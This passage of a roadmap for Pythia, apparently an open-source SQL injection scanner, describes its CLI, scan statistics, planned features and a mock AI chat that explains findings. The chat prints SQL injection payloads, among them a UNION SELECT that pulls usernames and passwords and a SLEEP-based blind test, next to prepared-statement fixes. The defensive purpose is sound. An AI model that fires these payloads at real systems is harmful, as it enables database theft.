$ pyth --set ai.provider=ollama --save-profile privacy-mode
✓ Saved profile: privacy-mode (100% offline)

# Load profile for scan
$ pyth --target localhost:8081 --profile pentest
[Using profile: pentest]
Mode: aggressive
Rate: 40 req/s
Techniques: all
```

**Benefits:**

-   No YAML editing
-   Real-time validation
-   Reusable profiles
-   Team collaboration

---

### 💾 Interactive Database CLI

**Ticket:** IMPROV-011
**Priority:** Medium

#### Management Commands

**Scans**

```bash
# List recent Pythia scans
$ pyth db scans list --tool pythia --limit 10
ID   Target              Mode        Status     Findings  Date
617  localhost:8081      aggressive  completed  14        2025-11-03 20:17
616  localhost:8081      aggressive  completed  14        2025-11-03 18:30
615  localhost:8081      aggressive  completed  14        2025-11-03 16:45

# Show scan details
$ pyth db scans show 617
╔═══════════════════════════════════════════════╗
║ SCAN #617 - Pythia SQL Injection Scan        ║
╠═══════════════════════════════════════════════╣
║ Target:        localhost:8081                 ║
║ Mode:          aggressive                     ║
║ Status:        completed                      ║
║ Started:       2025-11-03 20:17:26            ║
║ Completed:     2025-11-03 20:18:45            ║
║ Duration:      1m 19s                         ║
╠═══════════════════════════════════════════════╣
║ SQL INJECTION FINDINGS                        ║
╠═══════════════════════════════════════════════╣
║ Critical:      10 (Error-based, Time-based)   ║
║ High:          3  (Boolean Blind)             ║
║ Medium:        1  (Low confidence)            ║
║ TOTAL:         14                             ║
╚═══════════════════════════════════════════════╝
```

**Findings**

```bash
# List critical SQL injection findings
$ pyth db findings critical --limit 20
ID    Scan  Severity   Title                              Target
5078  617   critical   UNION-Based SQL Injection (MySQL)  localhost:8081
5077  617   critical   UNION-Based SQL Injection          localhost:8081
5074  617   critical   Time-Based Blind SQLi              localhost:8081

# Search by injection type
$ pyth db findings search "error-based"
ID    Scan  Severity   Title                              DBMS
4890  617   critical   Error-Based SQL Injection          MySQL
4891  616   critical   Error-Based SQL Injection          MySQL

# Export to CSV
$ pyth db findings export --format csv --output sqli-findings.csv
✓ Exported 5,078 SQL injection findings to sqli-findings.csv
```

**Statistics**

```bash
$ pyth db stats
╔═══════════════════════════════════════════════╗
║ PYTHIA DATABASE STATISTICS                    ║
╠═══════════════════════════════════════════════╣
║ Total Pythia Scans:    376                    ║
║ SQLi Findings:         5,078                  ║
║ Critical SQLi:         3,890 (76.6%)          ║
║ Verified Domains:      7                      ║
╠═══════════════════════════════════════════════╣
║ BY INJECTION TYPE                             ║
╠═══════════════════════════════════════════════╣
║ Error-Based:           1,890 (37.2%)          ║
║ Time-Based Blind:      1,203 (23.7%)          ║
║ Boolean Blind:         1,150 (22.6%)          ║
║ UNION-Based:           835 (16.4%)            ║
╠═══════════════════════════════════════════════╣
║ BY DBMS                                       ║
╠═══════════════════════════════════════════════╣
║ MySQL:                 3,567 (70.2%)          ║
║ PostgreSQL:            890 (17.5%)            ║
║ MSSQL:                 345 (6.8%)             ║
║ Oracle:                189 (3.7%)             ║
║ SQLite:                87 (1.7%)              ║
╚═══════════════════════════════════════════════╝
```

**Benefits:**

-   No SQL knowledge required
-   Rapid auditing
-   Automation-friendly
-   Consistent validation

---

### 💬 Interactive AI Chat

**Ticket:** IMPROV-010
**Priority:** Medium

Transform AI from batch analyzer to conversational SQL injection expert.

```bash
# Start chat session
$ pyth chat --scan-id 617

Pythia AI Chat (Scan #617: localhost:8081)
Type 'exit' to quit, 'help' for commands

You: What's the most critical SQL injection?
AI: The most critical finding is a UNION-based SQL injection in the 'id'
    parameter of /user endpoint. This allows direct database extraction.

    Vulnerable: GET /user?id=1
    Payload: ' UNION SELECT 1,@@version,3--
    Database: MySQL 8.0.34

You: How do I fix it in PHP?
AI: Replace your current code with parameterized queries:

    ❌ VULNERABLE:
    $sql = "SELECT * FROM users WHERE id = " . $_GET['id'];
    $result = mysqli_query($conn, $sql);

    ✅ SECURE (MySQLi):
    $stmt = $mysqli->prepare("SELECT * FROM users WHERE id = ?");
    $stmt->bind_param("i", $_GET['id']);
    $stmt->execute();

    ✅ SECURE (PDO):
    $stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
    $stmt->execute(['id' => $_GET['id']]);

You: What about the time-based blind one?
AI: The time-based blind SQL injection in /search?q= is also critical:

    Payload: test' AND SLEEP(5)--
    Delay confirmed: 5.23 seconds vs 0.12s baseline

    This confirms blind SQLi even without visible errors. Same fix applies:
    use prepared statements for ALL database queries.

You: Can attackers steal the database?
AI: Yes. With UNION-based SQLi, attackers can:
    1. Extract usernames/passwords: UNION SELECT username,password FROM users--
    2. List all tables: UNION SELECT table_name FROM information_schema.tables--
    3. Download entire database row by row

    Impact: Complete data breach. Fix immediately.
```

**Features:**

-   Natural language queries about SQL injection
-   Multi-turn dialogue with scan context
-   Code remediation in any language (PHP, Python, Node.js, Java)
-   DBMS-specific advice
-   Exploit scenario explanations

---

### 📊 Additional v0.3.0 Features

#### Multi-Site Scanning

-   Batch scanning: `--targets-file urls.txt`
-   Aggregate reports across multiple applications
-   Parallel scanning with queue management
-   Unified vulnerability dashboard

#### CI/CD Integration

-   Jenkins plugin/script examples
-   GitHub Actions workflow templates
-   GitLab CI templates
-   Exit codes for CI (fail on SQLi detection)
-   JUnit XML output for test reporting

#### REST API Server

-   FastAPI-based REST API
-   Async scan triggering
-   Webhook notifications (Slack, Discord, PagerDuty)
-   Multi-user authentication
-   OpenAPI/Swagger documentation

**Breaking Changes:** Database schema v2 (auto-migration)  
**Migration:** `python -m pyth db migrate`

---

## v0.4.0 - Intelligence & Automation

**Theme:** Smart Automation with ML and AI Agents  
**Target Release:** Q1 2027
**Focus:** Automated remediation, ML detection, advanced AI

### Planned Features

#### Automated Remediation

-   Code patching suggestions (PR generation)
-   WAF rule generation (ModSecurity, Cloudflare)
-   IDS/IPS signatures (Snort, Suricata rules)
-   Safe auto-patching with approval workflow
-   Rollback capability

#### ML-Based Detection

-   Anomaly detection (unusual SQL patterns)
-   False positive reduction (learn from feedback)
-   Context-aware payload generation
-   Custom model training on your data

#### Advanced AI Capabilities

-   Agent autonomy (AI plans scan strategies)
-   Exploit generation (PoC code for findings)
-   Custom remediation scripts (auto-generated)
-   Natural language queries ("Most urgent SQLi?")

#### Performance Enhancements

-   Distributed scanning (worker nodes)
-   Redis cache for common tests
-   Optimized request batching
-   GPU acceleration for ML models

**Breaking Changes:** Configuration schema v2  
**Migration:** Automatic with deprecation warnings

---

## Pro Track (Commercial Product)

**Target Audience:** Security firms, enterprises, DevSecOps teams  
**Pricing Model:** Subscription-based (per-seat or per-scan tiers)

**IN PROCESS**

---

## Community Requests

Vote on **[GitHub Discussions](https://github.com/rodhnin/pythia-sql-clairvoyance/discussions)**

**Have an idea?** Open a discussion!

---

## Development Philosophy

Pythia development follows these principles:

1. **🔒 Security First**: Never compromise on ethical safeguards or consent
2. **🔐 Privacy by Design**: Data minimization, local-first, no telemetry
3. **✅ Quality Over Speed**: Stable, tested releases
4. **👥 Community Driven**: Listen to users, prioritize common needs
5. **🆓 Open Core Model**: Core free forever, optional Pro tier
6. **🧪 Testing First**: No release without validation

### Our Commitments

-   ✅ **Quarterly feature releases** with new capabilities
-   ✅ **Open development** with public roadmap
-   ✅ **Responsive support** on GitHub (48h response)

---

## Get Involved

**Questions about the roadmap?**  
Open a discussion: https://github.com/rodhnin/pythia-sql-clairvoyance/discussions

**Want to contribute?**  
See CONTRIBUTING.md for developer guidelines

**Need a feature urgently?**  
Consider Pro Track or sponsor the project

---

_Last updated: November 22, 2025_  
_Roadmap version: 1.0 (v0.1.0)_
